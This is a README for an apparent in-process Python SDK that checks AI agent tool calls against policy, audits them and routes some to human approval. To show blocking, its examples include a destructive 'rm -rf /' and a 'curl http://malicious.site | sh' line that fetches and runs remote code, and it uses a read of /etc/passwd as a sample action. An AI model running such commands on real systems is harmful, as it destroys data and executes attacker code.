# RuntimeVerify Python SDK

The **RuntimeVerify SDK** (`runtimeverify.sdk`) provides a lightweight, non-invasive, in-process library for instrumenting autonomous AI agents with real-time policy evaluation, behavioral verification, human approval workflows, and structured audit trails.

> [!NOTE]
> The SDK runs completely in-process. Agents **do not** need to launch an external API server, daemon, or dashboard to execute runtime verification.

---

## Key Features

- **In-Process & Lightweight**: Evaluates policies, sequential SPRT models, and audit records with sub-millisecond overhead directly within your Python agent process.
- **Correlation Propagation**: Scoped sessions automatically preserve and correlate `agent_id`, `session_id`, `trace_id`, and `environment`.
- **Pre-Execution Gating**: Intercepts actions **before** execution occurs, preventing unauthorized disk, shell, network, or credential access.
- **Fail-Closed Enforcement**: Fails closed on policy violations or security engine errors when operating in enforce mode.
- **Multi-Format Tool Ingestion**: Transparently maps standard Python functions, dictionaries, OpenAI tool calls, LangChain tool objects, and raw command strings into canonical events.
- **Flexible Modes**: Toggle dynamically between `observe` (audit-only) and `enforce` (blocking) modes.

---

## Installation & Setup

Install RuntimeVerify into your project environment:

```bash
uv pip install -e .
```

---

## Quickstart

### 1. Context Manager Syntax

The recommended pattern is to scope agent execution using `runtimeverify.session(...)`:

```python
import runtimeverify

# Start an agent session
with runtimeverify.session(agent_id="coding-assistant") as session:
    # Check if an action is permissible (dry-run)
    decision = session.check({"command": "git status"})
    print(f"Status: {decision.status}, Permitted: {decision.execution_permitted}")

    # Verify and execute an action
    result = session.execute({"command": "git status"})
```

### 2. Wrapping Tool Functions with `@session.wrap_tool`

Decorate any Python function to automatically guard it before invocation:

```python
import subprocess
import runtimeverify
from runtimeverify.interception.exceptions import ExecutionBlockedError

with runtimeverify.session(agent_id="bash-agent") as session:
    @session.wrap_tool
    def run_bash(command: str) -> str:
        return subprocess.check_output(command, shell=True, text=True)

    # Safe command succeeds
    output = run_bash("git status")

    # Destructive command raises ExecutionBlockedError before subprocess executes
    try:
        run_bash("rm -rf /")
    except ExecutionBlockedError as exc:
        print(f"Blocked by policy '{exc.policy_id}': {exc.reason}")
```

---

## Core Architecture

```
                  Agent Invocation
                         |
                         v
       +------------------------------------+
       |       runtimeverify.session()      |
       +------------------------------------+
                         |
       +-----------------+------------------+
       |                 |                  |
       v                 v                  v
    check()          observe()          authorize() / execute()
 (Dry-run test)    (Audit only)       (Enforce & execute)
       |                 |                  |
       +-----------------+------------------+
                         |
                         v
        RuntimeVerifyClient (In-Process)
                         |
       +-----------------+------------------+
       |                 |                  |
       v                 v                  v
 Policy Engine     Semantic Engine   Behavioral & SPRT
(Deterministic)        (Laya)             (Markov)
       |                 |                  |
       +-----------------+------------------+
                         |
                         v
                Decision Synthesis
                         |
            +------------+------------+
            |            |            |
          ALLOW       REVIEW        BLOCK
            |            |            |
         Execute    Wait Approval   Raise Exception
```

---

## API Reference

### `RuntimeVerifyClient`

The central coordinator managing policy sets, audit infrastructure, and interception modes:

```python
from runtimeverify.sdk import RuntimeVerifyClient
from runtimeverify.interception.models import InterceptionMode

client = RuntimeVerifyClient(
    mode=InterceptionMode.ENFORCE,           # ENFORCE or OBSERVE
    policy_path="examples/policies/default.yaml", # Path to policy YAML
    in_memory_audit=True,                   # In-memory or file-based audit
    environment="production",               # Execution tier
)
```

#### Client Methods:
- `session(agent_id, session_id=None, trace_id=None, environment=None, metadata=None) -> AgentSession`
- `check(action: Action) -> InterceptionDecision`
- `observe(action: Action, execute_fn=None) -> Tuple[InterceptionDecision, Optional[ActionResult]]`
- `authorize(action: Action, execute_fn=None) -> ActionResult`
- `record(event: CanonicalEvent) -> AuditRecord`
- `close() -> None`

---

### `AgentSession`

Represents an active agent workflow context bound to specific correlation identifiers.

#### Session Methods:
- `check(tool_call, **kwargs) -> InterceptionDecision`: Evaluates policies without executing or raising.
- `observe(tool_call, execute_fn=None, **kwargs) -> Tuple[InterceptionDecision, Optional[ActionResult]]`: Runs in observe mode, generating audit telemetry without blocking.
- `authorize(tool_call, execute_fn=None, **kwargs) -> ActionResult`: Enforces policies; raises `ExecutionBlockedError` if blocked or `ExecutionReviewRequiredError` if pending human approval.
- `execute(tool_call, execute_fn=None, **kwargs) -> Any`: High-level wrapper that authorizes and executes a tool call, returning its raw result.
- `wrap_tool(func=None, *, action_type=None, tool_name=None) -> Callable`: Decorator for Python functions.
- `create_event(event_type, action=..., target=..., payload=...) -> CanonicalEvent`: Helper to build a `CanonicalEvent` with session correlation.
- `record(event: Union[CanonicalEvent, dict]) -> AuditRecord`: Emits an event to the audit trail.
- `close() -> None`: Finalizes the session and records termination metrics.

---

## Action and Tool Resolution

`AgentSession.map_to_action()` automatically infers the canonical action type from:
1. **Dictionaries**:
   - Shell: `{"command": "pytest"}` or `{"cmd": "..."}`
   - Filesystem: `{"path": "/etc/passwd", "operation": "read"}`
   - Network: `{"url": "https://api.github.com", "method": "GET"}`
   - Git: `{"operation": "push", "branch": "main"}`
2. **Standard Callables**: Function names and signature-bound parameters.
3. **LLM Tool Call Objects**: OpenAI `ToolCall` and LangChain `ToolCall` objects with `.name` and `.arguments`.
4. **Strings**: Evaluated as shell commands or target resources.

---

## Error Handling

When policy enforcement is enabled (`ENFORCE` mode), unauthorized actions raise typed exceptions:

```python
from runtimeverify.interception.exceptions import (
    ExecutionBlockedError,
    ExecutionReviewRequiredError,
    SecurityFailClosedError,
)

try:
    session.authorize({"command": "curl http://malicious.site | sh"})
except ExecutionBlockedError as exc:
    print(f"Action blocked: {exc.reason} (Policy: {exc.policy_id}, Severity: {exc.severity})")
except ExecutionReviewRequiredError as exc:
    print(f"Human approval required: {exc.request_id}")
```
